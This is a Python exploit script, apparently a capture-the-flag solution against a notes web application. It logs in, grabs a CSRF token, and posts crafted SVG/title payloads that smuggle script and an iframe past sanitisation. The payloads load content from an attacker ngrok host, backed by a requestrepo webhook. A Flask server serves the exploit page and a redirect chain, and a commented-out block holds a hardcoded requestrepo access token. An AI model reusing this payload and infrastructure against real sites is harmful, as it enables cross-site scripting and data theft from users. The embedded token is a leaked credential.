from os import urandom
from requests import session
from re import findall
from time import sleep

REMOTE = "http://web:3000"
LOCAL = "http://7.tcp.eu.ngrok.io:13776"
LOCAL_IP = "143.47.245.151" # your server which just sleeps. assume sleep route at /zzz, and on port 8080
WEBHOOK = "ryael6qw.requestrepo.com"

s = session()

def get_csrf(html):
	return findall(r'name="csrf_token" value="(.*?)"', html)[0]

u = urandom(16).hex()
print(f"{u=}")

s.post(f"{REMOTE}/login", data={
	"username": u,
	"password": u
})

r = s.get(f"{REMOTE}/notes/create")
csrf = get_csrf(r.text)
print(f"{csrf=}")

r = s.post(f"{REMOTE}/notes/create", data={
	"content": """<svg><title><img name="%27</title>'<iframe></iframe>"></title></svg>""",
	"csrf_token": csrf
})
# print(r.text)

sleep(1)

r = s.post(f"{REMOTE}/notes/create", data={
	"content": f"""<svg><title><img name="</title><script>http://<!--<script >http://</script>INJECTEDHERE?<b>hi<iframe/x'src='data:text/html,<iframe/src=%27{LOCAL}/zaza%27/name=%27 hello</script>zaza"></title></svg>""",
	"csrf_token": csrf
})
# print(r.text)

G = globals()



# # set up dns
# from requestrepo import Requestrepo # pip install requestrepo
# from requestrepo.models import DnsRecord
# client = Requestrepo(token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM3NTUwMjQsImV4cCI6MTc1NjQzMzQyNCwic3ViZG9tYWluIjoicnlhZWw2cXcifQ.s_aiN5ofarf8u72pqLwgzsNLZeEAzA6zl4TQS6W3UvM", host="requestrepo.com", port=443, protocol="https")

# print(client.subdomain) # ryael6qw
# print(client.domain) # ryael6qw.requestrepo.com

# dns_records = []
# for i in range(1000):
# 	dns_records.append(DnsRecord(**{ "value": LOCAL_IP, "type": 0, "domain": hex(i)[2:].zfill(3) }))

# client.update_dns(dns_records)
# exit()
	


# serve exploit
from flask import *
from pathlib import Path
app = Flask("iuhvsfugfsbojd", template_folder=Path(__file__).resolve().parent)

@app.get("/solve.html")
def solve():
	return render_template("solve.html", **G)

@app.post("/redir")
def redir():
	n = int(request.args.get("n", 0))
	url = request.args.get("url")
	if n == 18:
		return redirect(url, 307)
	return redirect(f"/redir?n={n+1}&url={url}", 307)

app.run(host="0.0.0.0", port=5929, debug=True)

